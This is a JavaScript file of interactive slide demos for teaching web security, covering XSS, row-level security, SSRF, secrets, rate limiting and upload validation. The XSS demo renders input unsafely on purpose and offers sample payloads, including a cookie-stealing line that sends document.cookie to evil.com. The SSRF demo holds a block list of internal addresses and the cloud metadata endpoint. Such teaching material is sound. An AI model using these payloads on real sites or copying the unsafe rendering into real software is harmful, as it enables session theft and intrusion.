// Slide demo functions

// Frontend vs Backend Demo
function initFrontendBackendDemo() {
  const checkoutBtn = document.getElementById('checkoutBtn');
  if (!checkoutBtn) return;

  let attempts = 0;
  
  checkoutBtn.addEventListener('click', () => {
    attempts++;
    const status = document.querySelector('#frontendBackendDemo .demo-status');
    
    if (checkoutBtn.disabled) {
      // This shouldn't happen normally, but DevTools can bypass
      status.innerHTML = `<span class="warning">⚠️ Button was disabled, but click went through! (Attempt ${attempts})</span>`;
    } else {
      status.innerHTML = `<span class="success">✅ Server validated: Payment processed! But in real life, server should check permissions regardless of UI state. (Attempt ${attempts})</span>`;
    }
    
    // Show the security lesson
    setTimeout(() => {
      status.innerHTML += `<br><strong>Security lesson:</strong> Always validate on the server, never trust the client!`;
    }, 1000);
  });

  // Show instructions
  const instructions = document.createElement('div');
  instructions.className = 'demo-instructions';
  instructions.innerHTML = `
    <p><strong>Try this:</strong></p>
    <ol>
      <li>Right-click the button → Inspect Element</li>
      <li>Remove the <code>disabled</code> attribute</li>
      <li>Click the button</li>
    </ol>
  `;
  checkoutBtn.parentNode.appendChild(instructions);
}

// Secrets Scanner Demo
function initSecretsDemo() {
  const secretInfo = document.querySelector('#secretsDemo .secret-info');
  if (!secretInfo) return;

  const secretData = {
    'supabase-public': {
      title: 'Supabase Anon Key',
      location: '✅ SAFE with VITE_',
      explanation: 'Public by design. Use VITE_ prefix so it gets bundled to frontend. Protected by RLS policies.',
      example: 'VITE_SUPABASE_ANON_KEY=eyJh...VCJ9',
      color: 'success'
    },
    'supabase-service': {
      title: 'Supabase Service Role Key',
      location: '🚨 NO VITE_ PREFIX',
      explanation: 'Bypasses all RLS! Keep in server .env file only (no VITE_ prefix).',
      example: 'SUPABASE_SERVICE_ROLE_KEY=eyJh...VCJ9',
      color: 'error'
    },
    'stripe-public': {
      title: 'Stripe Public Key',
      location: '✅ SAFE with VITE_',
      explanation: 'Starts with pk_. Can only create payment intents, not charge. Use VITE_ prefix.',
      example: 'VITE_STRIPE_PUBLIC_KEY=pk_test_51H...',
      color: 'success'
    },
    'stripe-secret': {
      title: 'Stripe Secret Key',
      location: '🚨 NO VITE_ PREFIX',
      explanation: 'Starts with sk_. Can charge cards! Keep server-only (no VITE_ prefix).',
      example: 'STRIPE_SECRET_KEY=sk_test_51H...',
      color: 'error'
    },
    'google-maps': {
      title: 'Google Maps API Key',
      location: '⚠️ VITE_ + domain restrictions',
      explanation: 'Can use VITE_ prefix BUT must restrict to your domain in Google Console.',
      example: 'VITE_GOOGLE_MAPS_KEY=AIza...WK',
      color: 'warning'
    },
    'jwt-secret': {
      title: 'JWT Signing Secret',
      location: '🚨 NO VITE_ PREFIX',
      explanation: 'Signs auth tokens. If leaked, anyone can fake users! Server .env only.',
      example: 'JWT_SECRET=your-256-bit...',
      color: 'error'
    }
  };

  window.showSecretInfo = function(secretType) {
    const data = secretData[secretType];
    if (!data) return;

    // Clear previous selections
    document.querySelectorAll('.secret-card').forEach(card => {
      card.classList.remove('selected');
    });
    
    // Mark current selection
    document.querySelector(`[data-secret="${secretType}"]`).classList.add('selected');

    secretInfo.innerHTML = `
      <div class="secret-details ${data.color}">
        <h4>${data.title}</h4>
        <div class="location">${data.location}</div>
        <p>${data.explanation}</p>
        <div class="example">
          <strong>Example:</strong>
          <code>${data.example}</code>
        </div>
      </div>
    `;
  };
}

// RLS Demo
function initRLSDemo() {
  let databaseRecords = []; // All records in the "database"
  let recordIdCounter = 1;
  
  const dataInput = document.querySelector('#rlsDemo #dataInput');
  const dataOwner = document.querySelector('#rlsDemo #dataOwner');
  const tableBody = document.querySelector('#rlsDemo #tableBody');
  const currentUser = document.querySelector('#rlsDemo #currentUser');
  const rlsEnabled = document.querySelector('#rlsDemo #rlsEnabled');
  const resultsBody = document.querySelector('#rlsDemo #resultsBody');
  const sqlDisplay = document.querySelector('#rlsDemo #sqlDisplay');
  const securityWarning = document.querySelector('#rlsDemo #securityWarning');
  const resultsTitle = document.querySelector('#rlsDemo #resultsTitle');
  
  if (!dataInput || !tableBody) return;

  function formatTime(date) {
    return date.toLocaleTimeString('en-US', { 
      hour12: false, 
      hour: '2-digit', 
      minute: '2-digit',
      second: '2-digit'
    });
  }

  function updateDatabaseTable() {
    tableBody.innerHTML = databaseRecords.map(record => 
      `<tr>
        <td>${record.id}</td>
        <td>${record.owner}</td>
        <td>${record.data}</td>
        <td>${formatTime(record.created)}</td>
      </tr>`
    ).join('');
  }

  function updateQueryResults() {
    const user = currentUser.value;
    const rlsOn = rlsEnabled.checked;
    
    let visibleRecords;
    let sqlQuery;
    
    if (rlsOn) {
      // RLS filters automatically
      visibleRecords = databaseRecords.filter(record => record.owner === user);
      sqlQuery = `SELECT * FROM notes WHERE owner = '${user}'; -- RLS automatically adds this filter`;
    } else {
      // No RLS - all records visible (security vulnerability!)
      visibleRecords = databaseRecords;
      sqlQuery = `SELECT * FROM notes; -- ⚠️ NO FILTERING - ALL DATA EXPOSED!`;
    }
    
    // Update SQL display
    sqlDisplay.innerHTML = `<code>${sqlQuery}</code>`;
    
    // Update results table
    resultsBody.innerHTML = visibleRecords.map((record, index) => {
      const isOwnRecord = record.owner === user;
      const rowClass = rlsOn ? (isOwnRecord ? 'accessible' : 'blocked') : (isOwnRecord ? 'own-record' : 'exposed-record');
      
      return `<tr class="${rowClass}">
        <td>${record.id}</td>
        <td>${record.owner}</td>
        <td>${record.data}</td>
        <td>${formatTime(record.created)}</td>
      </tr>`;
    }).join('');
    
    // Update title and warnings
    if (rlsOn) {
      resultsTitle.textContent = `Query Results (${visibleRecords.length} rows) - RLS Protected`;
      securityWarning.style.display = 'none';
    } else {
      resultsTitle.textContent = `Query Results (${visibleRecords.length} rows) - NO RLS PROTECTION`;
      const exposedRecords = visibleRecords.filter(record => record.owner !== user);
      if (exposedRecords.length > 0) {
        securityWarning.style.display = 'block';
        securityWarning.innerHTML = `
          <strong>🚨 SECURITY VULNERABILITY!</strong><br>
          User "${user}" can see ${exposedRecords.length} record(s) belonging to other users!<br>
          This is why RLS is essential for data protection.
        `;
      } else {
        securityWarning.style.display = 'none';
      }
    }
  }

  window.addDatabaseRecord = function() {
    if (!dataInput || !dataOwner) return;
    const data = dataInput.value.trim();
    if (!data) return;
    
    const record = {
      id: recordIdCounter++,
      owner: dataOwner.value,
      data: data,
      created: new Date()
    };
    
    databaseRecords.push(record);
    dataInput.value = '';
    
    updateDatabaseTable();
    // Don't auto-update query results - user must click query button
  };

  window.runQuery = function() {
    updateQueryResults();
  };

  window.resetDatabase = function() {
    databaseRecords = [];
    recordIdCounter = 1;
    updateDatabaseTable();
    
    // Reset query results to initial state
    resultsTitle.textContent = 'Query Results';
    sqlDisplay.innerHTML = '<code>Click "SELECT * FROM notes" to run query</code>';
    resultsBody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted); font-style: italic;">No query executed yet</td></tr>';
    securityWarning.style.display = 'none';
  };

  // Add Enter key support
  if (dataInput) {
    dataInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        addDatabaseRecord();
      }
    });
  }

  // Remove real-time updates - only update when query button is clicked

  // Initialize with some sample data
  databaseRecords = [
    { id: 1, owner: 'User A', data: 'My secret project notes', created: new Date(Date.now() - 120000) },
    { id: 2, owner: 'User B', data: 'Personal diary entry', created: new Date(Date.now() - 60000) }
  ];
  recordIdCounter = 3;
  
  updateDatabaseTable();
  
  // Initialize query results area with prompt to run query
  resultsTitle.textContent = 'Query Results';
  sqlDisplay.innerHTML = '<code>Click "SELECT * FROM notes" to run query</code>';
  resultsBody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted); font-style: italic;">No query executed yet</td></tr>';
  securityWarning.style.display = 'none';
}

// XSS Demo (Enhanced from existing)
function initXSSDemo() {
  const input = document.getElementById('xssInput');
  const output = document.getElementById('xssOut');
  const btnInsecure = document.getElementById('btnInsecure');
  const btnSecure = document.getElementById('btnSecure');
  const btnClear = document.getElementById('btnClear');
  
  if (!input || !output) return;

  btnInsecure?.addEventListener('click', () => {
    // Intentionally unsafe for demo
    const userInput = input.value;
    output.innerHTML = userInput;
    output.className = 'xss-output insecure';
    
    // Simulate XSS execution for demo purposes
    // Check if input contains XSS patterns and simulate their execution
    if (userInput.includes('<script>') || userInput.includes('onerror=') || userInput.includes('onload=') || userInput.includes('document.cookie') || userInput.includes('fetch(')) {
      // Add visual indicator that XSS would have executed
      setTimeout(() => {
        // Show XSS execution warning
        const xssWarning = document.createElement('div');
        xssWarning.className = 'xss-executed';
        
        // Check if it's a cookie theft attack for specific warning
        let warningMessage = '🚨 XSS EXECUTED! In a real app, malicious code would run here! 🚨';
        if (userInput.includes('document.cookie') || userInput.includes('fetch(')) {
          warningMessage = '🍪 COOKIE THEFT ATTACK! Session cookies would be stolen and sent to evil.com! 🚨';
        }
        
        xssWarning.innerHTML = warningMessage;
        xssWarning.style.cssText = `
          background: red; 
          color: white; 
          padding: 10px; 
          border: 2px solid darkred; 
          border-radius: 5px; 
          margin: 10px 0; 
          animation: pulse 1s infinite;
          font-weight: bold;
        `;
        output.appendChild(xssWarning);
        
        // Simulate page background flash
        document.body.style.backgroundColor = '#ff000033';
        setTimeout(() => {
          document.body.style.backgroundColor = '';
        }, 1000);
        
        // Show alert after visual effects
        setTimeout(() => {
          alert('🚨 XSS Attack Simulated! In a real application, malicious JavaScript would have executed.');
        }, 500);
        
      }, 100);
    }
  });

  btnSecure?.addEventListener('click', () => {
    // Safe text content
    output.textContent = input.value;
    output.className = 'xss-output secure';
  });

  btnClear?.addEventListener('click', () => {
    input.value = '';
    output.textContent = '';
    output.className = '';
  });

  // Add sample XSS payloads
  const samplesDiv = document.createElement('div');
  samplesDiv.className = 'xss-samples';
  samplesDiv.innerHTML = `
    <details>
      <summary>▼ Sample XSS Payloads (for testing)</summary>
      <div class="sample-buttons">
        <button type="button" data-payload="image">Image XSS</button>
        <button type="button" data-payload="script">Script Tag</button>
        <button type="button" data-payload="svg">SVG XSS</button>
        <button type="button" data-payload="cookie">Cookie Theft</button>
      </div>
    </details>
  `;
  
  // Add event listeners for sample buttons
  const sampleButtons = samplesDiv.querySelectorAll('button[data-payload]');
  sampleButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      const payload = btn.dataset.payload;
      switch(payload) {
        case 'image':
          input.value = '<img src=x onerror="this.style.backgroundColor=\'red\'; this.style.width=\'200px\'; this.style.height=\'50px\'; this.innerHTML=\'🚨 XSS EXECUTED! 🚨\';">';
          break;
        case 'script':
          input.value = '<script>document.body.style.backgroundColor="red"; setTimeout(() => document.body.style.backgroundColor="", 2000);</script>';
          break;
        case 'svg':
          input.value = '<svg onload="this.innerHTML=\'<text x=10 y=20 fill=red>🚨 XSS EXECUTED! 🚨</text>\'; this.style.backgroundColor=\'yellow\';" width="200" height="30">';
          break;
        case 'cookie':
          input.value = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\' + document.cookie)">';
          break;
      }
    });
  });
  
  input.parentNode.appendChild(samplesDiv);
}

// Rate Limiting Demo
function initRateLimitDemo() {
  const log = document.querySelector('#rateLimitDemo .request-log');
  if (!log) return;

  let requestCount = 0;
  let isLimited = false;
  const RATE_LIMIT = 5;
  const WINDOW_MS = 10000; // 10 seconds

  window.makeRequest = function() {
    requestCount++;
    
    if (requestCount > RATE_LIMIT && !isLimited) {
      isLimited = true;
      setTimeout(() => {
        isLimited = false;
        requestCount = 0;
      }, WINDOW_MS);
    }

    const timestamp = new Date().toLocaleTimeString();
    const status = isLimited ? '429 Too Many Requests' : '200 OK';
    const statusClass = isLimited ? 'error' : 'success';
    
    const logEntry = `
      <div class="log-entry ${statusClass}">
        [${timestamp}] Request ${requestCount}: ${status}
      </div>
    `;
    
    log.innerHTML = logEntry + log.innerHTML;
    
    // Limit log entries
    const entries = log.children;
    if (entries.length > 10) {
      entries[entries.length - 1].remove();
    }
  };

  window.floodRequests = function() {
    for (let i = 0; i < 10; i++) {
      setTimeout(() => makeRequest(), i * 100);
    }
  };

  window.resetLimits = function() {
    requestCount = 0;
    isLimited = false;
    log.innerHTML = '<p class="info">Rate limits reset!</p>';
  };
}

// Headers Demo
function initHeadersDemo() {
  window.checkHeaders = function() {
    const output = document.querySelector('#headersDemo .headers-output');
    if (!output) return;

    // Simulate checking headers (in real app, this would be a fetch)
    const mockHeaders = {
      'Content-Security-Policy': 'default-src \'self\'; script-src \'self\' \'unsafe-inline\'',
      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
      'X-Frame-Options': 'DENY',
      'X-Content-Type-Options': 'nosniff',
      'Referrer-Policy': 'strict-origin-when-cross-origin',
      'Access-Control-Allow-Origin': window.location.origin
    };

    const headersHtml = Object.entries(mockHeaders).map(([key, value]) => `
      <div class="header-item">
        <strong>${key}:</strong><br>
        <code>${value}</code>
      </div>
    `).join('');

    output.innerHTML = `
      <div class="headers-list">
        <h4>Current Security Headers:</h4>
        ${headersHtml}
      </div>
    `;
  };
}

// File Upload Demo
function initUploadDemo() {
  const fileInput = document.getElementById('fileInput');
  const uploadStatus = document.querySelector('#uploadDemo .upload-status');
  const validationResults = document.querySelector('#uploadDemo .validation-results');
  
  if (!fileInput || !uploadStatus || !validationResults) return;

  const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'text/plain', 'application/pdf'];
  const MAX_SIZE = 5 * 1024 * 1024; // 5MB

  fileInput.addEventListener('change', (e) => {
    const file = e.target.files[0];
    if (!file) return;

    uploadStatus.innerHTML = `<p>Validating file: <strong>${file.name}</strong></p>`;
    
    const validations = [];
    
    // Type validation
    if (ALLOWED_TYPES.includes(file.type)) {
      validations.push({ check: 'File type', status: 'pass', message: `${file.type} is allowed` });
    } else {
      validations.push({ check: 'File type', status: 'fail', message: `${file.type} is not allowed` });
    }
    
    // Size validation
    if (file.size <= MAX_SIZE) {
      validations.push({ check: 'File size', status: 'pass', message: `${(file.size / 1024 / 1024).toFixed(2)} MB is within limit` });
    } else {
      validations.push({ check: 'File size', status: 'fail', message: `${(file.size / 1024 / 1024).toFixed(2)} MB exceeds 5MB limit` });
    }
    
    // Extension check
    const ext = file.name.split('.').pop().toLowerCase();
    const suspiciousExts = ['exe', 'bat', 'cmd', 'com', 'pif', 'scr', 'vbs', 'js', 'jar'];
    if (suspiciousExts.includes(ext)) {
      validations.push({ check: 'File extension', status: 'fail', message: `${ext} files are blocked for security` });
    } else {
      validations.push({ check: 'File extension', status: 'pass', message: `${ext} extension is safe` });
    }

    const allPassed = validations.every(v => v.status === 'pass');
    
    validationResults.innerHTML = `
      <div class="validation-summary ${allPassed ? 'success' : 'error'}">
        ${allPassed ? '✅ File would be accepted' : '❌ File would be rejected'}
      </div>
      <div class="validation-details">
        ${validations.map(v => `
          <div class="validation-item ${v.status}">
            <strong>${v.check}:</strong> ${v.message}
          </div>
        `).join('')}
      </div>
    `;
  });
}

// SSRF Protection Demo
function initSSRFDemo() {
  window.testSSRF = function(button) {
    const input = button.previousElementSibling;
    const results = document.querySelector('#ssrfDemo .ssrf-results');
    const url = input.value;
    
    if (!url) {
      results.innerHTML = '<p class="warning">Please enter a URL to test!</p>';
      return;
    }

    // Simulate SSRF protection
    const blocked = [
      'localhost',
      '127.0.0.1',
      '169.254.169.254', // AWS metadata
      '0.0.0.0',
      '10.',
      '192.168.',
      '172.16.',
      '172.17.',
      '172.18.',
      '172.19.',
      '172.20.',
      '172.21.',
      '172.22.',
      '172.23.',
      '172.24.',
      '172.25.',
      '172.26.',
      '172.27.',
      '172.28.',
      '172.29.',
      '172.30.',
      '172.31.'
    ];

    const isBlocked = blocked.some(pattern => url.includes(pattern));
    
    if (isBlocked) {
      results.innerHTML = `
        <div class="ssrf-result error">
          ❌ Request blocked: URL targets private/internal network
          <br><strong>Blocked URL:</strong> <code>${url}</code>
          <br><em>This protects against SSRF attacks</em>
        </div>
      `;
    } else {
      results.innerHTML = `
        <div class="ssrf-result success">
          ✅ Request would be allowed: URL targets public internet
          <br><strong>URL:</strong> <code>${url}</code>
          <br><em>Remember to also validate response content and implement timeouts</em>
        </div>
      `;
    }
  };

  // Add sample dangerous URLs
  const container = document.querySelector('#ssrfDemo');
  const samples = document.createElement('div');
  samples.className = 'ssrf-samples';
  samples.innerHTML = `
    <p><strong>Try these:</strong></p>
    <div class="sample-buttons">
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://169.254.169.254/latest/meta-data/'">AWS Metadata</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://localhost:3000/admin'">Localhost</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'https://example.com/api'">Safe External</button>
    </div>
  `;
  container.appendChild(samples);
}

// RLS Testing Demo
function initRLSTestingDemo() {
  window.runRLSTest = function() {
    const output = document.querySelector('#rlsTestDemo .test-output');
    if (!output) return;

    output.innerHTML = '<div class="loading">Running RLS tests...</div>';
    
    // Simulate the 3-step test
    const steps = [
      { step: 1, description: 'Creating test users A and B...', delay: 1000 },
      { step: 2, description: 'Testing User A permissions...', delay: 2000 },
      { step: 3, description: 'Testing User B permissions...', delay: 3000 },
      { step: 4, description: 'Analyzing results...', delay: 4000 }
    ];

    steps.forEach(({ step, description, delay }) => {
      setTimeout(() => {
        if (step < 4) {
          output.innerHTML += `<div class="test-step">Step ${step}: ${description}</div>`;
        } else {
          // Final results
          const results = Math.random() > 0.5 ? 'pass' : 'fail';
          output.innerHTML += `
            <div class="test-results ${results}">
              <h4>Test Results:</h4>
              ${results === 'pass' ? `
                <div class="result-item success">✅ User A can read/write own data</div>
                <div class="result-item success">✅ User A cannot read User B's data</div>
                <div class="result-item success">✅ User B can read/write own data</div>
                <div class="result-item success">✅ User B cannot read User A's data</div>
                <p class="conclusion success">🎉 RLS is working correctly!</p>
              ` : `
                <div class="result-item success">✅ User A can read/write own data</div>
                <div class="result-item error">❌ User A can read User B's data</div>
                <div class="result-item success">✅ User B can read/write own data</div>
                <div class="result-item error">❌ User B can read User A's data</div>
                <p class="conclusion error">⚠️ RLS policies need fixing!</p>
              `}
            </div>
          `;
        }
      }, delay);
    });
  };
}

// Mindset Demo
function initMindsetDemo() {
  // Make sure the function is globally available
  if (typeof window !== 'undefined') {
    window.showThinking = function(type) {
      const output = document.getElementById('thinkingOutput');
      if (!output) {
        console.log('thinkingOutput element not found');
        return;
      }
      
      console.log('showThinking called with type:', type);
      
      if (type === 'developer') {
        output.innerHTML = `
          <div class="thinking-result developer">
            <h4>👨‍💻 Developer Perspective:</h4>
            <ul>
              <li>"User clicks button → item gets added to cart"</li>
              <li>"Need to update the cart count in the UI"</li>
              <li>"Make sure the button doesn't double-click"</li>
              <li>"Check if item is in stock"</li>
            </ul>
            <p class="thinking-note">Focus: Functionality and user experience</p>
          </div>
        `;
      } else if (type === 'attacker') {
        output.innerHTML = `
          <div class="thinking-result attacker">
            <h4>🔥 Attacker Perspective:</h4>
            <ul>
              <li>"Can I add negative quantities to get money back?"</li>
              <li>"What if I change the product ID to something expensive?"</li>
              <li>"Can I add items that don't exist or are deleted?"</li>
              <li>"What if I spam this 1000 times per second?"</li>
              <li>"Can I add items for other users' carts?"</li>
              <li>"What happens if I modify the price in the request?"</li>
            </ul>
            <p class="thinking-note danger">Focus: How to exploit and break the system</p>
          </div>
        `;
      }
    };
  }
}

// Initialize all demos
function initAllDemos() {
  // Wait for DOM to be ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      setTimeout(initAllDemos, 100);
    });
    return;
  }

  initMindsetDemo();
  initFrontendBackendDemo();
  initSecretsDemo();
  initRLSDemo();
  initXSSDemo();
  initRateLimitDemo();
  initHeadersDemo();
  initUploadDemo();
  initSSRFDemo();
  initRLSTestingDemo();
}